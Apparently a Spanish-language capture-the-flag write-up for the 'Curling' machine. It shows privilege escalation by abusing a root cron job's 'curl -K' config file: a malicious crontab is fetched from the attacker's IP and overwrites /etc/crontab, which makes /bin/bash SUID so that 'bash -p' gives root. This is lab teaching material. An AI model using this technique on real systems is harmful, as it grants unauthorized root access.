##### Enumeracion
Ejecutamos el [[PSPY]]
![[Curling18.png]]
Vemos en el PID 2872 el curl que manda con el parametro `curl -K`, que sirve para especificar la configuracion mediante un archivo.    [[curl]]

##### Explotacion
Vamos a crear un archivo exploit en un nuestra maquina
```
SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin

* * * * * root chmod u+s /bin/bash
```
Vamos a abrir un server con [[python3 -m http.server]]

Contenido del archivo input
```
url = "http://10.10.16.4/exploit"              // En donde esta el 10.10.16.4 va nuestra ip de atacante y despues del / va el nombre del archivo
output = "/etc/crontab"
```

Ahora cuando se ejecute la tarea cron, va a hacer que la bash tenga permisos SUID
![[Curling19.png]]
Una vez que vemos la s, ya sabemos que podemos ejecutar `bash -p` para ganar permisos en la bash
![[Curling20.png]]
Ya estamos logeados como root, asi que podemos visualizar la flag


